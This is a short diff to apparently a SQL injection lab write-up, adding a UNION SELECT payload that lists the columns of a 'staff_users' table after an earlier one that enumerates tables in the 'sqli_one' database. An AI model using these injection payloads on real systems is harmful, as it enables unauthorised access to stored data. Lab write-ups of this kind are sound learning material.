@@ -59,3 +59,6 @@ It now shows the name of the database, which is `sqli_one`.<br/>
     0 UNION SELECT 1,2,group_concat(table_name) FROM information_schema.tables WHERE table_schema = 'sqli_one'
 ![tables name](images/13-get-tables-name.png)<br/>
 The information we want to retrieve has changed from table_name to `column_name`, the table we are querying in the information_schema database has changed from tables to `columns`, and we're searching for any rows where the `table_name` column has a value of `staff_users`.<br/>
+
+    0 UNION SELECT 1,2,group_concat(column_name) FROM information_schema.columns WHERE table_name = 'staff_users'
+![columns](images/14-all-columns.png)<br/>
